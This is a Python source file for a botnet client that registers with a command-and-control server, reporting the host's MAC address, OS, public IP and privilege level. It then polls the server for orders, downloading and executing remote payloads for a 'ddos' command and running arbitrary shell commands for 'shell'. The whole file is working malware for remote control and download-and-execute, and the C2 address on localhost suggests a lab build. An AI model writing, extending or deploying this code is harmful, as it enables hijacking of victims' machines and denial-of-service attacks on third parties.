import requests
import time
import subprocess
import ctypes
import os
from getmac import get_mac_address as gma
import platform


C2_URL = "http://127.0.0.1:8000/control/"
BOT_ID = gma()
POLLING_INTERVAL = 30
#PAYLOADS_DIR = ""

def is_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    return is_admin

def os_info():
    if platform.system() == "Windows":
        return platform.system() + " " + platform.release() + " " + platform.version()
    elif platform.system() == "Linux":
        return platform.freedesktop_os_release()["NAME"] + " " + platform.release()

print(os_info())

def register():
    try:
        print(f"[+] Registering bot ID: {BOT_ID}")
        info = {
            "mac": BOT_ID,
            "os": os_info(),
            "arch": platform.architecture()[0],
            "ip_address": requests.get('https://api4.ipify.org').text,
            "privileges": "admin" if is_admin() else "user"
            
        }
        response = requests.post(C2_URL + 'register/', json=info)
        if response.status_code == 200:
            print("[+] Registration successful")
        else:
            print(f"[-] Registration failed: {response.status_code}")
    except Exception as e:
        print(f"[-] Error registering with C2: {e}")


def download_and_execute(payload_url, args):
    try:
        print(f"[+] Downloading payload from {payload_url}")
        response = requests.get(payload_url)
        
        if response.status_code == 200:
            payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(payload_url))
            with open(payload_path, "wb") as file:
                file.write(response.content)

            print(f"[+] Payload downloaded to {payload_path}")

            if payload_path.endswith(".py"):
                command = f"python3 {payload_path} {args}"
            else:
                command = f"{payload_path} {args}"
                
            print(f"[+] Executing payload: {command}")
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            print(f"[+] Execution result:\n{result.decode('utf-8')}")

            return result.decode('utf-8')
        else:
            return f"Failed to download payload: {response.status_code}"
    except Exception as e:
        return str(e)


def poll_for_commands():
    while True:
        try:
            print(f"[+] Polling for commands from C2... Bot ID: {BOT_ID}")
            response = requests.get(C2_URL + "command/", params={"mac": BOT_ID}, timeout=30)
            print(response.text)
            if response.status_code == 200:
                command = response.json().get("command")
                payload_url = response.json().get("payload_url")
                args = response.json().get("args")

                if command:
                    print(f"[+] Received command: {command}")
                    
                    if command == "ddos":
                        if payload_url:
                            result = download_and_execute(payload_url, args if args else "")
                        else:
                            result = "Invalid payload details"
                    elif command == "shell":
                        result = execute_shell_command(args)
                    else:
                        result = f"Unknown command: {command}"
                    if result:
                        requests.post(C2_URL + "result/", json={"mac": BOT_ID})
                else:
                    print("[+] No command received")

            else:
                print(f"[-] Failed to poll: {response.status_code}")
                time.sleep(30)
        
        except requests.exceptions.Timeout:
            print("[+] Polling timed out, retrying...")
            time.sleep(POLLING_INTERVAL)
        except Exception as e:
            print(f"[-] Error polling for commands: {e}")
            time.sleep(POLLING_INTERVAL)


def execute_shell_command(command):
    try:
        print(f"[+] Executing command: {command}")
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    register()
    poll_for_commands()
